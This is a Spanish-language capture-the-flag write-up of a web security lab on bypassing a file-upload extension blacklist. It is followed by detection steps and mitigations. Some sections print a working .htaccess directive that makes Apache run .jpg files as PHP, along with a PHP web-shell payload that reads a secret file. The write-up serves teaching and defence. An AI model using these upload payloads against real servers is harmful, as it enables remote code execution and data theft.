---
title: "Lab: Web shell upload via extension blacklist bypass"
date: 2026-06-05
category: "File Upload"
order: 6
tags: ["web-security-academy", "file-upload", "lab", "rce", "htaccess"]
layout: layouts/writeup.njk
permalink: /writeups/file-upload-lab-extension-blacklist-bypass.html
---

## Descripción de la vulnerabilidad

Este lab tiene una **blacklist de extensiones** — el servidor rechaza archivos `.php`. Sin embargo, Apache puede ser reconfigurado en tiempo real mediante un archivo `.htaccess` subido al mismo directorio. Si el servidor permite subir ese archivo, el atacante puede modificar el comportamiento de Apache para que ejecute extensiones alternativas (como `.jpg`) como PHP, bypasseando completamente la blacklist.

**`.htaccess`:** archivo de configuración de Apache que aplica reglas específicas al directorio donde está ubicado. Apache lo lee automáticamente en cada request. Si un atacante puede subir uno, puede cambiar cómo Apache maneja los archivos de ese directorio.

---

## Reconocimiento

Se intentó subir `BasicWebShell.php` directamente. El servidor respondió:

```
HTTP/2 403 Forbidden
Sorry, php files are not allowed
```

Esto confirmó que la validación es por **extensión** — el servidor tiene una blacklist que incluye `.php`. A diferencia del lab de Content-Type, aquí cambiar el MIME type no sirve de nada porque el filtro lee el filename, no el Content-Type declarado. Confirmado al intentar con `Content-Type: image/jpeg` — mismo 403.

---

## Ataque

### Intento 1 — Extensión alternativa `.php5`

```
filename="BasicWebShell.php5"
```

**Resultado:** `200 OK` — el servidor aceptó el archivo porque `.php5` no estaba en la blacklist. Sin embargo, al acceder a `/files/avatars/BasicWebShell.php5`, el servidor devolvió el código PHP como texto plano. La blacklist no incluía `.php5` pero Apache tampoco lo ejecutaba en ese directorio.

> **Señal clave:** el 200 OK solo confirma que el archivo fue aceptado y guardado. No confirma que se ejecutó. Siempre hay que verificar accediendo a la ruta.

**¿Por qué no se ejecutó?** El directorio `avatars/` tenía una restricción de Apache que impedía ejecutar scripts — probablemente `php_flag engine off` u otra directiva similar. Esa restricción aplica a **todas** las extensiones sin importar cuál sea, incluyendo `.php5`.

Había dos problemas separados que resolver:

1. **Blacklist** — bloqueaba `.php` en la subida → bypasseable con `.php5`.
2. **Restricción del directorio** — Apache no ejecutaba scripts en `avatars/` → requería `.htaccess`.

### Intento 2 — Path traversal con `.php5` (no aplica)

Se intentó usar path traversal en el filename para escapar del directorio protegido. El servidor sanitizó el traversal literal y guardó en `avatars/` de todas formas. Este vector no era el correcto para este lab.

### Intento 3 — `.shtml` (Server Side Includes)

```
filename="BasicWebShell.shtml"
```

**Resultado:** `200 OK` pero sin ejecución. `.shtml` usa SSI (Server Side Includes), cuya sintaxis es diferente a PHP (`<!--#exec cmd="..." -->`). El payload PHP no funciona con SSI, y además el directorio probablemente tampoco tenía SSI habilitado.

### Intento 4 — `testing.htaccess` con directiva PHP (incompleto)

```
filename="testing.htaccess"
Content: AddType application/x-httpd-php .jpg
```

**Resultado:** `200 OK` y el servidor confirmó que el archivo fue guardado. Sin embargo, Apache **solo lee el archivo que se llama exactamente `.htaccess`** — cualquier otro nombre es ignorado como archivo de configuración. `testing.htaccess` fue guardado como un archivo normal sin ningún efecto en la configuración de Apache.

### Intento 5 — `.htaccess` con nombre correcto + `BasicWebShell.jpg` ✅

**Paso 1:** Subir el archivo de configuración con el nombre exacto:

```
filename=".htaccess"
Content: AddType application/x-httpd-php .jpg
```

**Resultado:** `200 OK`

```
The file avatars/.htaccess has been uploaded.
```

Al intentar acceder a `.htaccess` directamente, el servidor devolvió `403 Forbidden` — comportamiento normal y esperado, Apache protege sus archivos de configuración de ser leídos públicamente. Esto confirmó que el archivo fue reconocido como configuración.

**Paso 2:** Subir el web shell con extensión `.jpg`:

```
filename="BasicWebShell.jpg"
Content-Type: image/jpeg
Content: <?php echo file_get_contents('/home/carlos/secret'); ?>
```

**Resultado:** `200 OK` — el servidor aceptó `.jpg` porque no está en la blacklist.

**Paso 3:** Al recargar `/my-account`, el avatar mostró directamente la flag en la página:

```
2N27iuhIXaBzs0k6ddA5Byz9lnjkv4WQ
```

Apache leyó el `.htaccess`, aplicó la directiva `AddType application/x-httpd-php .jpg`, y ejecutó `BasicWebShell.jpg` como PHP.

**¿Por qué la flag cargó directo en el browser sin necesitar Burp?** Porque el `.htaccess` hizo que Apache ejecutara el `.jpg` como PHP y devolviera texto plano. El browser intentó renderizarlo como imagen, falló, y mostró el output del PHP directamente donde debería estar el avatar.

---

## Por qué funcionó

El `.htaccess` le dijo a Apache: *"en este directorio, tratá los archivos `.jpg` como PHP"*. A partir de ese momento, cualquier `.jpg` en `avatars/` fue ejecutado por el intérprete PHP en lugar de ser servido como imagen.

La blacklist del servidor solo bloqueaba extensiones conocidas de PHP (`.php`, etc.) pero no bloqueaba `.htaccess` ni `.jpg`. El atacante usó `.htaccess` para redefinir las reglas del juego dentro del directorio.

---

## Nota comparativa — Solución de Burp vs lo que se hizo

<table>
<tr><td>Aspecto</td><td>Lo que se hizo</td><td>Solución de Burp</td></tr>
<tr><td>Extensión del shell</td><td><code>.jpg</code></td><td><code>.l33t</code></td></tr>
<tr><td>Content-Type del <code>.htaccess</code></td><td><code>application/octet-stream</code></td><td><code>text/plain</code></td></tr>
<tr><td>Cómo se vio la flag</td><td>Cargó en el avatar del browser</td><td>GET en Burp Repeater</td></tr>
</table>

Burp cambia el Content-Type del `.htaccess` a `text/plain` por buena práctica — es el MIME type semánticamente correcto para un archivo de texto plano. En servidores más estrictos que validen el Content-Type del archivo de configuración, ese cambio podría ser necesario.

**Regla general:** si funciona sin cambiar el MIME type, el servidor no lo está validando. Si falla con un error de tipo de archivo, ahí se cambia.

---

## Preguntas frecuentes

**¿El servidor tiraba el PHP como texto plano — eso significa que el directorio no permitía ejecución de PHP?** Sí. Cuando Apache sirve un `.php` como texto plano en lugar de ejecutarlo, hay una directiva de configuración que lo impide. El `.htaccess` subido sobreescribió esa restricción para los archivos `.jpg`.

**¿Por qué el `testing.htaccess` subió sin error pero no tuvo efecto?** Porque Apache solo reconoce como archivo de configuración el archivo llamado exactamente `.htaccess`.

**¿Por qué el `.php5` dio 200 OK pero no funcionó?** El 200 OK solo confirma que el servidor aceptó y guardó el archivo, no confirma ejecución.

**¿Por qué al consultar `.htaccess` apareció 403 Forbidden?** Comportamiento normal — Apache tiene una directiva por defecto que impide el acceso público a los archivos `.htaccess`.

---

## Cómo identificarlo en blackbox

1. Subir un `.php` y observar si el servidor rechaza por extensión — el mensaje lo indica explícitamente (`php files are not allowed`).
2. Confirmar que cambiar el Content-Type no ayuda — si sigue dando 403, la validación es por extensión.
3. Intentar extensiones alternativas (`.php5`, `.phtml`) para ver cuáles acepta la blacklist.
4. Si el directorio no ejecuta scripts aunque la extensión pase — buscar si el servidor es Apache (lo revela el header `Server: Apache/2.4.41`).
5. Intentar subir `.htaccess` — si el servidor lo acepta, hay control sobre la configuración del directorio.
6. Verificar que `.htaccess` fue reconocido como configuración intentando acceder a él — un `403 Forbidden` confirma que Apache lo procesó.

---

## Error del desarrollador

```python
# Blacklist incompleta — falta .htaccess, .htpasswd y otros
EXTENSIONES_BLOQUEADAS = ['.php', '.php5', '.phtml', '.asp', '.jsp']

if extension in EXTENSIONES_BLOQUEADAS:
    return error("Extensión no permitida")
```

El segundo error fue confiar en una blacklist en lugar de una whitelist. Una blacklist siempre puede tener huecos.

---

## Mitigación

**Usar whitelist en lugar de blacklist:**

```python
EXTENSIONES_PERMITIDAS = ['.jpg', '.jpeg', '.png', '.gif']

extension = os.path.splitext(filename)[1].lower()
if extension not in EXTENSIONES_PERMITIDAS:
    return error("Solo se permiten imágenes")
```

- **Bloquear explícitamente `.htaccess`** y cualquier archivo de configuración del servidor.
- **Renombrar el archivo al guardarlo** con un nombre generado por el servidor.
- **Guardar fuera del webroot** o en un servidor que no ejecute scripts.
- **Deshabilitar `AllowOverride`** en la configuración global de Apache:

```
<Directory /var/www/html/files/avatars>
    AllowOverride None
</Directory>
```

---

## Impacto

RCE completo. La combinación de poder subir `.htaccess` y un archivo con extensión arbitraria permitió al atacante redefinir las reglas de ejecución de Apache y ejecutar código PHP disfrazado de imagen. Cualquier defensa basada en blacklist de extensiones es bypasseable si el servidor es Apache y permite subir `.htaccess`.
